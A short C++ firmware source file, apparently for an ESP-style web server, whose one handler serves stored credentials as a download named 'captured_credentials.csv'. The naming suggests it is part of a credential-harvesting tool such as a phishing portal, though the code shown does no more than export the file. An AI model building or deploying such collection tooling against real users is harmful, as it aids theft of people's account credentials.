#include "web_export.h"
#include "storage.h"

void serveCredentialExport(WebServer& server) {
    String csv = exportCredentialsAsCSV();

    server.sendHeader("Content-Type", "text/csv");
    server.sendHeader("Content-Disposition", "attachment; filename=\"captured_credentials.csv\"");
    server.sendHeader("Cache-Control", "no-cache");
    server.send(200, "text/csv", csv);
}
